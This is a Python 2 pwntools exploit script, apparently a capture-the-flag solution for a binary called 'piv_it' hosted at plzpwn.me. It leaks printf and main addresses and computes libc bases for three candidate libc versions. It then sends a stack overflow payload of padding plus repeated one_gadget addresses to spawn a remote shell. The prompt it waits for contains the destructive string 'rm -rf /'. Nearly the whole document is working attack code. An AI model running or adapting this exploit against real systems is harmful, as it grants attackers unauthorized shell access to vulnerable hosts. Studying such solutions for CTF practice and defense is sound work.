#python2
from pwn import *

context.binary = './piv_it'

#io = process("./piv_it")
io = remote("plzpwn.me", 8002)

print("[]Waiting for ROOTURPC")
io.recvuntil("rm -rf /")
print("[]Waiting done")

io.recvuntil("Unexpected Error Encountered At:")
addr_printf = io.recvline().strip()
addr_printf_int = int(addr_printf,16)
print("[!]addr_printf: ["+addr_printf+"]")

"""
0xf75d72d0
0xf75c52d0
"""

"""
libc6-amd64_2.21-0ubuntu4.3_i386
libc6-i386_2.10.1-0ubuntu19_amd64
libc6_2.27-3ubuntu1_i386
"""

io.recvuntil("Manual Override Initiated")
io.recvuntil("$")
wtf_buffer1 = "6447"
io.sendline(wtf_buffer1)

"""
IDA
main	00000725	
0000302C		__libc_start_main	
__libc_csu_init	00000950	
"""

io.recvuntil("Unexpected Error Encountered At: ")
addr_main = io.recvline().strip()
print("[!]addr_main: ["+addr_main+"]")
addr_main_int = int(addr_main,16)

io.recvuntil("Safe Mode Enabled")
io.recvuntil("$")

ida_main = 0x00000725
###########
plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_offset_printf = 0x000000000004f2d0

plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_binsh1 = 0x3f856 
plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_binsh2 = 0x3f8aa 
plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_binsh3 = 0xd6f2d 
#############
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_offset_printf = 0x000472d0

plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh1 = 0x392b4 
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh2 = 0x5e38b 
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh3 = 0x5e391 
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_binsh4 = 0x5e395 
##############
plshaq_libc6_2_27_3ubuntu1_i386_offset_printf = 0x000512d0

plshaq_libc6_2_27_3ubuntu1_i386_binsh1 = 0x3d0d3 
plshaq_libc6_2_27_3ubuntu1_i386_binsh2 = 0x3d0d5 
plshaq_libc6_2_27_3ubuntu1_i386_binsh3 = 0x3d0d9 
plshaq_libc6_2_27_3ubuntu1_i386_binsh4 = 0x3d0e0 
plshaq_libc6_2_27_3ubuntu1_i386_binsh5 = 0x67a7f 
plshaq_libc6_2_27_3ubuntu1_i386_binsh6 = 0x67a80 
plshaq_libc6_2_27_3ubuntu1_i386_binsh7 = 0x137e5e 
plshaq_libc6_2_27_3ubuntu1_i386_binsh8 = 0x137e5f 
##############

# Anyway
real_elf_base = addr_main_int - ida_main

pay = ""
#   char buf[20]; // [esp+Ch] [ebp-1Ch]
pay += "A"*20
pay += "BBBB"*3 # not too sure why

#   read(0, buf, 0x38u);
# 1. 0x38u = 56
# 2. 56-20-12=36-12=24 
# 3. 24 / sizeof str for 32bit = 24 / 4 = 6 addresses long ROP

plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_base = addr_printf_int - plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_offset_printf
plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_base = addr_printf_int - plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_offset_printf
plshaq_libc6_2_27_3ubuntu1_i386_base = addr_printf_int - plshaq_libc6_2_27_3ubuntu1_i386_offset_printf

print("supposed libc base 1: "+hex(plshaq_libc6_amd64_2_21_0ubuntu4_3_i386_base))
print("supposed libc base 2: "+hex(plshaq_libc6_i386_2_10_1_0ubuntu19_amd64_base))
print("supposed libc base 3: "+hex(plshaq_libc6_2_27_3ubuntu1_i386_base))

"""
 EAX  0x0
 EBX  0x0
 ECX  0xffffd510  0x1
 EDX  0xf7fb1890x(_IO_stdfile_1_lock)  0x0
 EDI  0x0
 ESI  0xf7fb0000 (_GLOBAL_OFFSET_TABLE_)  0x1d7d6c
 EBP  0x0
 ESP  0xffffd4fc 0xf7df0e81 (__libc_start_main+241) add    esp, 0x10
 EIP  0x5655593f (main+538)  lea esp, [ecx - 4]
"""

pay += str(p32(plshaq_libc6_2_27_3ubuntu1_i386_base+plshaq_libc6_2_27_3ubuntu1_i386_binsh8))*6
"""
binsh   return
1   -11
2   -11
3   -11 (but weird)
4   -11
5   127
6   127
7   127
8   127
"""

print("pay: ["+pay+"]")
print("pay len: "+str(len(pay)))

io.sendline(pay)
io.interactive()
